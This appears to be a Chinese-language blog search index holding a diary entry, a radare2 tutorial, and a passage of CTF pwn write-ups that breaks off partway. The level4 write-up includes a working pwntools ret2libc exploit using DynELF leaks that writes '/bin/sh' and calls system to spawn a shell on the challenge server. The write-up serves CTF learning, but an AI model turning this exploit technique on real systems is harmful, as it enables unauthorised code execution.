<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Diary.20181008</title>
      <link href="/2018/10/08/diary-20181008/"/>
      <url>/2018/10/08/diary-20181008/</url>
      <content type="html"><![CDATA[<p>  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；<br>nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；<br>黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；<br>配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。<br>周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh</p><p>…搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Radare2</title>
      <link href="/2018/09/25/radare2/"/>
      <url>/2018/09/25/radare2/</url>
      <content type="html"><![CDATA[<p><em>之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm</em></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><em>之后学习使用中逐渐更新</em><br>常用包含工具：</p><ul><li>radare2-&gt;整合了所有工具</li><li>rabin2-&gt;查看文件格式的</li><li>radiff2-&gt;比较文件不同的</li><li>rahash2-&gt;各种密码算法，hash算法集成</li><li>rasm2-&gt;汇编和反汇编</li><li>ragg2-&gt;开发shellcode工具(radare2自己编写的编译器)</li></ul><h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><pre><code>随便加载个文件,会有一句欢迎语hhhh</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$r2 pwnme</span><br><span class="line"> -- We only have bugs, features are an unintended side-effect</span><br><span class="line">[0x08049090]&gt;                  //工具找到的入口位置</span><br></pre></td></tr></table></figure><h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><pre><code>查看文件基本信息</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># rabin2 -I pwnme</span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x8048000</span><br><span class="line">binsz    14275</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">sanitiz  false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><pre><code>支持超多加解密</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># rahash2 -L    //列举</span><br><span class="line">Available Hashes: </span><br><span class="line">h  md5</span><br><span class="line">h  sha1</span><br><span class="line">h  sha256</span><br><span class="line">h  sha384</span><br><span class="line">h  sha512</span><br><span class="line">h  md4</span><br><span class="line">h  xor</span><br><span class="line">h  xorpair</span><br><span class="line">h  parity</span><br><span class="line">h  entropy</span><br><span class="line">h  hamdist</span><br><span class="line">h  pcprint</span><br><span class="line">h  mod255</span><br><span class="line">h  xxhash</span><br><span class="line">h  adler32</span><br><span class="line">h  luhn</span><br><span class="line">h  crc8smbus</span><br><span class="line">h  crc15can</span><br><span class="line">h  crc16</span><br><span class="line">h  crc16hdlc</span><br><span class="line">h  crc16usb</span><br><span class="line">h  crc16citt</span><br><span class="line">h  crc24</span><br><span class="line">h  crc32</span><br><span class="line">h  crc32c</span><br><span class="line">h  crc32ecma267</span><br><span class="line">h  crc32bzip2</span><br><span class="line">h  crc32d</span><br><span class="line">h  crc32mpeg2</span><br><span class="line">h  crc32posix</span><br><span class="line">h  crc32q</span><br><span class="line">h  crc32jamcrc</span><br><span class="line">h  crc32xfer</span><br><span class="line">h  crc64</span><br><span class="line">h  crc64ecma</span><br><span class="line">h  crc64we</span><br><span class="line">h  crc64xz</span><br><span class="line">h  crc64iso</span><br><span class="line"></span><br><span class="line">Available Encoders/Decoders: </span><br><span class="line">e  base64</span><br><span class="line">e  base91</span><br><span class="line">e  punycode</span><br><span class="line"></span><br><span class="line">Available Crypto Algos: </span><br><span class="line">c  rc2</span><br><span class="line">c  rc4</span><br><span class="line">c  rc6</span><br><span class="line">c  aes-ecb</span><br><span class="line">c  aes-cbc</span><br><span class="line">c  ror</span><br><span class="line">c  rol</span><br><span class="line">c  rot</span><br><span class="line">c  blowfish</span><br><span class="line">c  cps2</span><br><span class="line">c  des-ecb</span><br><span class="line">c  xor</span><br><span class="line">c  serpent-ecb</span><br><span class="line"></span><br><span class="line"># rahash2 -a md5 ./pwnme       //生成md5哈希</span><br><span class="line">./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56</span><br></pre></td></tr></table></figure><h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><pre><code>支持汇编反汇编 </code></pre><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><pre><code>据说可以用来快速开发shellcode？</code></pre><h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><pre><code>支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。P.S.暂时不晓得有啥用</code></pre><h3 id="rafind2"><a href="#rafind2" class="headerlink" title="rafind2"></a>rafind2</h3><pre><code>在文件中查找字节模式</code></pre><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><pre><code>用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和覆盖的默认文件描述符。rarun2可用于：* 破解小程序* 模糊测试* 测试组件</code></pre><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><pre><code>用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示，十六进制字符串到ASCII之间进行基本转换，八进制到整数等。它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li>i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program</span><br><span class="line"></span><br><span class="line">1 entrypoints</span><br><span class="line"></span><br><span class="line">[0x08049090]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">Num Vaddr      Paddr      Len Size Section  Type  String</span><br><span class="line">000 0x00002008 0x0804a008   7   8 (.rodata) ascii /bin/sh</span><br><span class="line">001 0x00002010 0x0804a010   5   6 (.rodata) ascii input</span><br></pre></td></tr></table></figure><ul><li>a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># r2 -A pwnme</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[x] Type matching analysis for all functions (afta)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line"> -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS</span><br></pre></td></tr></table></figure><ul><li>fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces="">，一个 flag 是所有类似特征的集合。可以使用 ‘fs <flagspaces>‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’).</flagspaces></flag></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; fs</span><br><span class="line">0    2 * strings</span><br><span class="line">1   37 * symbols</span><br><span class="line">2   30 * sections</span><br><span class="line">3   12 * segments</span><br><span class="line">4    5 * relocs</span><br><span class="line">5    5 * imports</span><br><span class="line">6    2 * functions</span><br><span class="line">[0x08049090]&gt; fs strings;f</span><br><span class="line">0x0804a008 8 str.bin_sh</span><br><span class="line">0x0804a010 6 str.input</span><br></pre></td></tr></table></figure><ul><li><p>axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p></li><li><p>vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。)</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-[ functions ]----------------- pdf ---</span><br><span class="line">(a) add     (x) xrefs  (q) quit  (jk) next/prev                         ;-- section..text:</span><br><span class="line">(r) rename  (c) calls  (g) go    (tab) column                           ;-- eip:</span><br><span class="line">(d) delete  (v) vars   (?) help  (:)  enter cmd             / (fcn) entry0 50</span><br><span class="line">&gt;* 0x08049090   50 entry0                                   |   entry0 ();</span><br><span class="line">   0x080490c3    4 fcn.080490c3                             |           0x08049090      xor ebp, ebp                               ; [14] -r-x secti</span><br><span class="line">   0x08049070    6 sym.imp.__libc_start_main                |           0x08049092      pop esi</span><br><span class="line">   0x080490f0   40 sym.deregister_tm_clones                 |           0x08049093      mov ecx, esp</span><br><span class="line">   0x08049130   53 sym.register_tm_clones                   |           0x08049095      and esp, 0xfffffff0</span><br><span class="line">   0x08049170   30 sym.__do_global_dtors_aux                |           0x08049098      push eax</span><br><span class="line">   0x080491a0    2 entry1.init                              |           0x08049099      push esp</span><br><span class="line">   0x080492b0    2 sym.__libc_csu_fini                      |           0x0804909a      push edx</span><br><span class="line">   0x080490e0    4 sym.__x86.get_pc_thunk.bx                |           0x0804909b      call fcn.080490c3</span><br><span class="line">   0x080492b4   20 sym._fini                                |           0x080490a0      add ebx, 0x2f60                            ; &apos;`/&apos;</span><br><span class="line">   0x08049250   93 sym.__libc_csu_init                      |           0x080490a6      lea eax, [ebx - 0x2d50]</span><br><span class="line">   0x080490d0    2 sym._dl_relocate_static_pie              |           0x080490ac      push eax                                   ; func fini</span><br><span class="line">   0x08049203   65 sym.main                                 |           0x080490ad      lea eax, [ebx - 0x2db0]</span><br><span class="line">   0x08049244    4 sym.__x86.get_pc_thunk.ax                |           0x080490b3      push eax                                   ; func init</span><br><span class="line">   0x08049050    6 sym.imp.puts                             |           0x080490b4      push ecx                                   ; char **ubp_av</span><br><span class="line">   0x080491cd   54 sym.vulnerable                           |           0x080490b5      push esi                                   ; int argc</span><br><span class="line">   0x08049040    6 sym.imp.gets                             |           0x080490b6      mov eax, sym.main                          ; 0x8049203</span><br><span class="line">   0x080491a2   43 sym.flag                                 |           0x080490bc      push eax                                   ; func main</span><br><span class="line">   0x08049060    6 sym.imp.system                           \           0x080490bd      call sym.imp.__libc_start_main             ; int __libc_star</span><br><span class="line">   0x08049000   35 sym._init</span><br><span class="line">   0x08049080    6 sub.__gmon_start_80</span><br></pre></td></tr></table></figure><ul><li>s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; s main</span><br><span class="line">[0x08049203]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 65</span><br><span class="line">|   sym.main (int argc, char **argv, char **envp);</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           ; DATA XREF from entry0 (0x80490b6)</span><br><span class="line">|           0x08049203      8d4c2404       lea ecx, [arg_4h]           ; 4</span><br><span class="line">|           0x08049207      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x0804920a      ff71fc         push dword [ecx - 4]</span><br><span class="line">|           0x0804920d      55             push ebp</span><br><span class="line">|           0x0804920e      89e5           mov ebp, esp</span><br><span class="line">|           0x08049210      53             push ebx</span><br><span class="line">|           0x08049211      51             push ecx</span><br><span class="line">|           0x08049212      e82d000000     call sym.__x86.get_pc_thunk.ax</span><br><span class="line">|           0x08049217      05e92d0000     add eax, 0x2de9</span><br><span class="line">|           0x0804921c      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804921f      8d9010e0ffff   lea edx, [eax - 0x1ff0]</span><br><span class="line">|           0x08049225      52             push edx                    ; const char *s</span><br><span class="line">|           0x08049226      89c3           mov ebx, eax</span><br><span class="line">|           0x08049228      e823feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0804922d      83c410         add esp, 0x10</span><br><span class="line">|           0x08049230      e898ffffff     call sym.vulnerable</span><br><span class="line">|           0x08049235      b800000000     mov eax, 0</span><br><span class="line">|           0x0804923a      8d65f8         lea esp, [local_8h]</span><br><span class="line">|           0x0804923d      59             pop ecx</span><br><span class="line">|           0x0804923e      5b             pop ebx</span><br><span class="line">|           0x0804923f      5d             pop ebp</span><br><span class="line">|           0x08049240      8d61fc         lea esp, [ecx - 4]</span><br><span class="line">\           0x08049243      c3             ret</span><br></pre></td></tr></table></figure><p>radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[0x08049203]&gt; pdc</span><br><span class="line">function sym.main () &#123;</span><br><span class="line">    //  1 basic blocks</span><br><span class="line"></span><br><span class="line">    loc_0x8049203:</span><br><span class="line"></span><br><span class="line">  //DATA XREF from entry0 (0x80490b6)</span><br><span class="line">       ecx = [arg_4h]           //4</span><br><span class="line">       esp &amp;= 0xfffffff0        //ebp</span><br><span class="line">       push dword [ecx - 4]</span><br><span class="line">       push ebp</span><br><span class="line">       ebp = esp</span><br><span class="line">       push ebx</span><br><span class="line">       push ecx</span><br><span class="line">       sym.__x86.get_pc_thunk.ax ()</span><br><span class="line">       eax += 0x2de9            //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       esp -= 0xc</span><br><span class="line">       edx = [eax - 0x1ff0]     //&quot;input&quot; str.input</span><br><span class="line">       push edx                 //const char *s ; (pstr 0x0804a010) &quot;input&quot;</span><br><span class="line">       ebx = eax                //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       </span><br><span class="line">       int puts(const char * s : (*0x804a010)0x00177fe0 = input)</span><br><span class="line">       esp += 0x10</span><br><span class="line">       sym.vulnerable ()</span><br><span class="line">       eax = 0</span><br><span class="line">       esp = [local_8h]</span><br><span class="line">       pop ecx</span><br><span class="line">       pop ebx</span><br><span class="line">                                //ebp</span><br><span class="line">       esp = [ecx - 4]          //ebp</span><br><span class="line">       return</span><br><span class="line">(break)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞</p><pre><code>.---------------------------------------------------.     | [0x8049203]                                       |     | ;-- main:                                         |     | ;-- eip:                                          |     | (fcn) sym.main 65                                 |     |   sym.main (int argc, char **argv, char **envp);  |     | ; var int local_8h @ ebp-0x8                      |     | ; arg int arg_4h @ esp+0x4                        |     | ; DATA XREF from entry0 (0x80490b6)               |     | ; 4     |     | lea ecx, [arg_4h]                                 |     | and esp, 0xfffffff0                               |     | push dword [ecx - 4]                              |     | push ebp                                          |     | mov ebp, esp                                      |     | push ebx                                          |     | push ecx                                          |     | call sym.__x86.get_pc_thunk.ax;[ga]               |     | add eax, 0x2de9                                   |     | sub esp, 0xc                                      |     | lea edx, [eax - 0x1ff0]                           |     | ; const char *s                                   |     | push edx                                          |     | mov ebx, eax                                      |     | ; int puts(const char *s)                         |     | call sym.imp.puts;[gb]                            |     | add esp, 0x10                                     |     | call sym.vulnerable;[gc]                          |     | mov eax, 0                                        |     | lea esp, [local_8h]                               |  `---------------------------------------------------&apos;                                          </code></pre><p><em>目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis OJ-pwn</title>
      <link href="/2018/09/13/jarvis-oj-pwn/"/>
      <url>/2018/09/13/jarvis-oj-pwn/</url>
      <content type="html"><![CDATA[<p><em>开始漫漫刷题之路</em></p><h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><em>参考:<a href="&quot;https://blog.csdn.net/u011987514/article/details/68490157&quot;">借助DynELF实现无libc的漏洞利用小结</a></em></p><h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p><em>搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸<br>重新下载源文件，问题解决。。。</em></p><h2 id="信息："><a href="#信息：" class="headerlink" title="信息："></a>信息：</h2><p>漏洞函数：明显的栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="思路："><a href="#思路：" class="headerlink" 